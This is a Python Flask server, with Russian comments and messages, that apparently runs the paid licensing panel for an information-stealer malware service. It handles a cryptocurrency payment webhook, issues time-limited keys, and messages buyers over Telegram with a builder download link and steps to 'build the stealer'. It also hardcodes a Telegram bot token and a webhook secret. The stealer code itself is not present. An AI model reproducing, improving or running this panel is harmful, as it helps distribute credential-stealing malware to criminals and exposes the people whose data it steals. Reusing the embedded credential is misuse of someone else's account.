import os
import time
import json
import sqlite3
import secrets
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# ===== КОНФИГ =====
BOT_TOKEN = "8871915410:AAGygotrS3NoIPjhB1U-nGXxI3FgcimhAO0"
WEBHOOK_SECRET = "afrikanec"
BUILDER_LINK = "https://dropmefiles.com/unpyb"

# ===== БАЗА ДАННЫХ (SQLite) =====
DB_FILE = "panel.db"

def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE NOT NULL,
            username TEXT,
            first_name TEXT,
            key TEXT UNIQUE NOT NULL,
            created_at INTEGER NOT NULL,
            expires_at INTEGER NOT NULL,
            status TEXT DEFAULT 'active'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            invoice_id TEXT UNIQUE,
            amount INTEGER NOT NULL,
            days INTEGER NOT NULL,
            currency TEXT DEFAULT 'USDT',
            status TEXT DEFAULT 'pending',
            created_at INTEGER NOT NULL,
            FOREIGN KEY (user_id) REFERENCES clients (user_id)
        )
    ''')
    conn.commit()
    conn.close()
    print("База данных инициализирована")

init_db()

def add_client(user_id, username, first_name, key, expires_at):
    conn = get_db()
    try:
        conn.execute('''
            INSERT OR REPLACE INTO clients (user_id, username, first_name, key, created_at, expires_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, key, int(time.time()), expires_at))
        conn.commit()
        return True
    except Exception as e:
        print(f"Ошибка: {e}")
        return False
    finally:
        conn.close()

def get_client_by_id(user_id):
    conn = get_db()
    try:
        result = conn.execute('SELECT * FROM clients WHERE user_id = ?', (user_id,)).fetchone()
        return dict(result) if result else None
    except:
        return None
    finally:
        conn.close()

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=data, timeout=10)
        return True
    except:
        return False

@app.route(f'/crypto/{WEBHOOK_SECRET}', methods=['POST'])
def crypto_webhook():
    try:
        data = request.get_json()
        print(f"Получен вебхук: {json.dumps(data, indent=2)}")

        if data.get('update_type') == 'invoice_paid':
            payload = data.get('payload', {})
            invoice_id = payload.get('invoice_id')
            user_id = payload.get('user_id')
            amount = payload.get('amount')
            asset = payload.get('asset')

            try:
                meta = json.loads(payload.get('meta', '{}'))
                days = meta.get('days', 30)
            except:
                days = 30

            print(f"Оплата: #{invoice_id} от {user_id} на {amount} {asset} ({days} дней)")

            existing = get_client_by_id(user_id)
            if existing and existing['expires_at'] > int(time.time()):
                return jsonify({"ok": True}), 200

            new_key = secrets.token_hex(8).upper()
            expires_at = int(time.time()) + days * 86400
            add_client(user_id, "", "", new_key, expires_at)

            message = (
                f"✅ **Оплата подтверждена!**\n\n"
                f"🔑 **Твой ключ:** `{new_key}`\n"
                f"📅 Действует: {days} дней\n\n"
                f"📦 **Скачай билдер:**\n{BUILDER_LINK}\n\n"
                f"Инструкция:\n"
                f"1. Скачай билдер\n"
                f"2. Введи ключ\n"
                f"3. Собери стилер"
            )
            send_telegram_message(user_id, message)

            return jsonify({"ok": True}), 200

        return jsonify({"ok": True}), 200

    except Exception as e:
        print(f"Ошибка: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001)